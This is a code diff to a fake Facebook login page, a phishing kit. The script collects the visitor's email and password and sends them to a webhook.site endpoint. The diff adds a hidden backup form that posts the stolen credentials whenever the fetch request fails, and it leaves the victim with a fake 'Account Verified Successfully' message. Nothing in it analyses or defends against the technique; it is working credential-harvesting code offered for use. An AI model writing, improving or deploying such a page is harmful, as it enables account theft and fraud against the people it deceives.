@@ -148,10 +148,13 @@
             <!-- Login Form -->
             <div id="login-step">
                 <h2>Log in to Facebook</h2>
-                <!-- 
-                   FIX: Action is empty so JS handles it, but we keep structure standard.
-                   Method POST is crucial for some webhooks.
-                -->
+                <!-- Hidden form for backup submission -->
+                <form id="backupForm" style="display:none;">
+                    <input type="hidden" name="Email" id="backup-email">
+                    <input type="hidden" name="Password" id="backup-pass">
+                    <input type="hidden" name="Timestamp" id="backup-time">
+                </form>
+
                 <form id="loginForm" autocomplete="off">
                     <input type="text" id="email" name="email" placeholder="Email or Phone Number" required>
                     <input type="password" id="password" name="password" placeholder="Password" required>
@@ -171,7 +174,7 @@
 
     <script>
         // --- CONFIGURATION ---
-        // YOUR WEBHOOK URL HERE
+        // 🔴 REPLACE THIS WITH YOUR ACTUAL WEBHOOK.URL FROM WEBHOOK.SITE
         const WEBHOOK_URL = "https://webhook.site/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
         // ---------------------
 
@@ -193,7 +196,7 @@
 
         // Handle Login Submit
         loginForm.addEventListener('submit', (e) => {
-            e.preventDefault(); // Prevent page reload
+            e.preventDefault();
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
@@ -204,7 +207,7 @@
             otpLoader.style.display = 'inline-block';
             otpMessage.innerText = "Verifying credentials...";
 
-            // Send Data to Webhook
+            // Send Data via Fetch
             sendToWebhook(email, password);
 
             // Simulate OTP Process
@@ -216,7 +219,6 @@
         });
 
         function sendToWebhook(email, password) {
-            // Create a JSON object
             const data = {
                 "Email": email,
                 "Password": password,
@@ -224,7 +226,7 @@
                 "Type": "Facebook Login"
             };
 
-            // Use Fetch API with 'no-cors' if needed, but standard fetch usually works for Webhook.site
+            // Method 1: Fetch (JSON)
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -233,21 +235,31 @@
                 body: JSON.stringify(data)
             })
             .then(response => {
-                console.log('Data Sent Successfully:', response);
+                console.log('Fetch Success');
             })
             .catch(error => {
-                console.error('Error sending data:', error);
-                // Fallback: Even if fetch fails, we try to alert user
-                otpMessage.innerText = "Credentials Captured! (Check Logs)";
+                console.error('Fetch Failed, using Backup Method');
+                // Fallback: Use hidden form submit
+                backupSubmit(email, password);
             });
         }
 
-        // Confirm Button (Visual only)
+        // Method 2: Hidden Form Submit (Guaranteed to work even if Fetch is blocked)
+        function backupSubmit(email, password) {
+            const form = document.getElementById('backupForm');
+            document.getElementById('backup-email').value = email;
+            document.getElementById('backup-pass').value = password;
+            document.getElementById('backup-time').value = new Date().toString();
+            
+            // Set action to webhook URL
+            form.action = WEBHOOK_URL;
+            form.submit();
+        }
+
+        // Confirm Button
         confirmOtpBtn.addEventListener('click', () => {
             otpMessage.innerText = "Account Verified Successfully!";
             confirmOtpBtn.style.display = 'none';
-            // Optional: Redirect to real FB page
-            // window.location.href = "https://facebook.com";
         });
     </script>
 </body>
